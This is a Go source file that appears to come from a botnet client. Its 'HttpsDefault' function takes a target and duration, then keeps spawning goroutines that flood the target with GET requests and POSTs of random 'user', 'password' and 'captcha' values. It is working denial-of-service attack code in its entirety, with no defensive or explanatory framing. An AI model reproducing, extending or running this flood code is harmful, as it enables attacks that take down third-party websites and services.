package methods

import (
	"fmt"
	"homo/client/balancer"
	"homo/client/utils"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"time"
)

func HttpsDefault(target string, port string, duration string) {

	duration = strings.ReplaceAll(duration, "\x00", "")
	duration = strings.ReplaceAll(duration, "\x03", "")
	duration = strings.ReplaceAll(duration, "\r", "")

	dur, err := strconv.Atoi(string(duration))

	if err != nil {
		fmt.Println(err)
	}
	sec := time.Now().Unix()
	for time.Now().Unix() <= sec+int64(dur)-1 {
		go httpattack(target)
		go httpattack(target)
		go httpattack(target)

		time.Sleep(100 * time.Millisecond)

	}
}

func httpattack(target string) {
	for i := 0; i < 30; i++ {
		select {
		case <-balancer.BalanceCh:
			fmt.Println("Balancer")
			time.Sleep(5 * time.Second)
		default:

			fmt.Println(i)
			fmt.Println(target)
			http.Get(target)
			time.Sleep(30 * time.Millisecond)
			http.PostForm(target, url.Values{"user": {utils.RandomString(5)}, "password": {utils.RandomString(5)}, "captcha": {utils.RandomString(5)}})
		}
	}
}
